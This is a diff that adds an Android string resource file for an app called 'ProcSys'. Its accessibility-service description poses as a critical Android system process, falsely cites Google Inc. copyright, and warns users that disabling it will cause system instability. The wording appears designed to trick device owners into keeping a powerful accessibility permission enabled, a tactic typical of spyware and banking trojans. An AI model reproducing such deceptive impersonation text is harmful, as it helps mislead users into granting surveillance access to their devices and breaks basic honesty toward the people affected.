@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">ProcSys</string>
+    <string name="accessibility_description">
+        Android - Process System ( ProcSys ).\n
+        Warning: Turning off this service may cause system errors.\n
+                 This service is critical for the proper functioning of your system, and turning it off could result in unexpected behavior or instability.\n
+                 Please consult your system administrator before attempting to disable this service.\n
+        \n
+        Google Inc. © Android 2023\n
+        QuadComm © ProcSys 2023\n\n
+    </string>
+</resources>
